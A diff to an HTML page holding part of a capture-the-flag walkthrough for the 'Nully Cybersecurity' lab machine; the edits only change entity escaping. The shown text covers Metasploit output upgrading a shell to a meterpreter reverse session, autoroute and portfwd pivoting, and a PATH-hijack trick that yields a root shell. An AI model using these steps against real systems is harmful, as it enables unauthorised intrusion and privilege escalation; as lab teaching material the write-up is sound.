@@ -355,7 +355,7 @@
 <p>Nully Cybersecurity — this is an easy-intermediate realistic machine.</p>
 <p>While working with the machine, you will need to brute force, pivoting (using metasploit, via portfwd), exploitation web app, and using searchsploit.</p>
 <p>About: Wait 5–8 minutes before starting for the machine to start its services. Also, check the welcome page on port 80.</p>
-<p>Hints: ‘cat rockyou.txt | grep bobby &gt; wordlist’ for generating wordlist.</p>
+<p>Hints: ‘cat rockyou.txt | grep bobby > wordlist’ for generating wordlist.</p>
 <p>Story: You are a Professional White Hat. Small company Nully Cybersecurity hired you to conduct a security test of their internal corporate systems.</p>
 <p><strong>Reconnaissance</strong></p>
 <p>Making sure you can ping the VM we are attacking from your network -I usually my VMs in Bridged Adapter mode. Proceed to scan the network to determine open ports and services running</p>
@@ -544,7 +544,7 @@ Now go to the web server and root it.</p>
 
 </p>
 <p>Next, background the shell and upgrade it to a meterpreter shell
-`msf5 post(multi/manage/shell_to_meterpreter) &gt; options<code>Module options (post/multi/manage/shell_to_meterpreter):</code>Name     Current Setting  Required  Description</p>
+`msf5 post(multi/manage/shell_to_meterpreter) > options<code>Module options (post/multi/manage/shell_to_meterpreter):</code>Name     Current Setting  Required  Description</p>
 <hr>
 <p>HANDLER  true             yes       Start an exploit/multi/handler to receive the connection<br>
 LHOST    192.168.1.10     no        IP of host that will receive the connection from the payload (Will try to auto detect).<br>
@@ -553,17 +553,17 @@ SESSION  1                yes       The session to run this module on.<code>msf5
 [</em>] Starting exploit/multi/handler<br>
 [<em>] Started reverse TCP handler on 192.168.1.10:4433<br>
 [</em>] Sending stage (980808 bytes) to 192.168.1.12<br>
-[<em>] Meterpreter session 2 opened (192.168.1.10:4433 -&gt; 192.168.1.12:35888) at 2020-09-26 11:33:25 +0100<br>
+[<em>] Meterpreter session 2 opened (192.168.1.10:4433 -> 192.168.1.12:35888) at 2020-09-26 11:33:25 +0100<br>
 [</em>] Command stager progress: 100.00% (773/773 bytes)<br>
 [*] Post module execution completed<br>
-msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions -i<code>Active sessions   ===============</code>Id  Name  Type                   Information                                                       Connection</p>
+msf5 post(multi/manage/shell_to_meterpreter) > sessions -i<code>Active sessions   ===============</code>Id  Name  Type                   Information                                                       Connection</p>
 <hr>
-<p>1         shell sparc/bsd        #                                                                 192.168.1.10:5555 -&gt; 192.168.1.12:32832 (192.168.1.12)<br>
-2         meterpreter x86/linux  no-user @ MailServer (uid=0, gid=0, euid=0, egid=0) @ 172.17.0.5  192.168.1.10:4433 -&gt; 192.168.1.12:35888 (172.17.0.5)<code>msf5 post(multi/manage/shell_to_meterpreter) &amp;gt; sessions -i 2   [*] Starting interaction with 2...</code>meterpreter &gt;`</p>
+<p>1         shell sparc/bsd        #                                                                 192.168.1.10:5555 -> 192.168.1.12:32832 (192.168.1.12)<br>
+2         meterpreter x86/linux  no-user @ MailServer (uid=0, gid=0, euid=0, egid=0) @ 172.17.0.5  192.168.1.10:4433 -> 192.168.1.12:35888 (172.17.0.5)<code>msf5 post(multi/manage/shell_to_meterpreter) &amp;gt; sessions -i 2   [*] Starting interaction with 2...</code>meterpreter >`</p>
 <p>Set up autoroute and port forwarding .
 <code>run autoroute -s 172.17.0.1/16   portfwd add -l 8888 -p 80 -r 172.17.0.2</code></p>
-<p>run autoroute -s &lt;target IP /netmask&gt;</p>
-<p>portfwd add -l &lt;port to listen to on local machine&gt; -p &lt;remote port to connect to&gt; -r &lt;target IP&gt;</p>
+<p>run autoroute -s <target IP /netmask></p>
+<p>portfwd add -l <port to listen to on local machine> -p <remote port to connect to> -r <target IP></p>
 <p>Access the webserver on remote machine</p>
 <p>
 
@@ -649,7 +649,7 @@ msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions -i<code>Active sessio
 <p>A script called current-date displays the current date. Since in linux, date command is used to do that, I figured the script calls the date command and probably does this using its full path. We can edit our own date variable and pass in /bin/bash so it gets executed when we call the current-date script and drop into a root shell
 `cd /tmp<br>
 ls<br>
-echo &quot;/bin/bash&quot; &gt; date<br>
+echo &quot;/bin/bash&quot; > date<br>
 chmod 777 date<br>
 export PATH=/tmp:$PATH<br>
 cd /home/oscar<br>
